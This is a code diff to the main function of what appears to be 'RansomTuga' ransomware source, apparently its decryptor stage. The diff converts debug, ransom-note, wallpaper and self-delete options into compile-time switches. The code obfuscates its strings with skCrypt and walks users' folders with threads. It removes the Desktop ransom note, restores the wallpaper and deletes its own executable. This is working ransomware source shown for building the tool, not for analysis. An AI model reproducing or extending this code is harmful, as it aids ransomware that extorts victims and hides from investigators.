@@ -63,16 +63,16 @@ int main(int argc, char* argv[])
 
     
     string dir;
-    if (!DEBUG)
-        dir = (string)skCrypt("C:\\Users\\");
-    else {
-        if (argc > 1)
-            dir = argv[1];
-        else if (FileExists(DEBUG_FOLDER))
-            dir = DEBUG_FOLDER;
-        else
-            dir = (string)skCrypt(".\\");
-    }
+#if !DEBUG
+    dir = (string)skCrypt("C:\\Users\\");
+#else 
+    if (argc > 1)
+        dir = argv[1];
+    else if (FileExists(DEBUG_FOLDER))
+        dir = DEBUG_FOLDER;
+    else
+        dir = (string)skCrypt(".\\");
+#endif
 
     vector<vector<string>> filesSplitted = VectorSplitter(GetFiles(dir), MAX_THREADS);
 
@@ -85,20 +85,24 @@ int main(int argc, char* argv[])
         threads[i].join();
 
 
-    if (DROP_README)
-        if (remove(((string)skCrypt("C:\\Users\\") + GetUsername() + (string)skCrypt("\\Desktop\\README.txt")).c_str()) != 0)
-            DeleteFileA(((string)skCrypt("C:\\Users\\") + GetUsername() + (string)skCrypt("\\Desktop\\README.txt")).c_str());
+#if DROP_README
+    if (remove(((string)skCrypt("C:\\Users\\") + GetUsername() + (string)skCrypt("\\Desktop\\README.txt")).c_str()) != 0)
+        DeleteFileA(((string)skCrypt("C:\\Users\\") + GetUsername() + (string)skCrypt("\\Desktop\\README.txt")).c_str());
+#endif
 
-    if (CHANGE_WALLPAPER) {
-        RestoreWallpaper();
-        if (remove((NEWWALLPAPER).c_str()) != 0)
-            DeleteFileA((NEWWALLPAPER).c_str());
-    }
+#if CHANGE_WALLPAPER
+    RestoreWallpaper();
+    if (remove((NEWWALLPAPER).c_str()) != 0)
+        DeleteFileA((NEWWALLPAPER).c_str());
+#endif
 
     cout << skCrypt("Thank you for choosing RansomTuga!\n\n");
     system(skCrypt("pause"));
 
-    if (!DEBUG && argc > 0)
+#if !DEBUG && SELFKILL
+    if (argc > 0)
         DeleteMe((string)argv[0]);
+#endif
+
     return 0;
 }
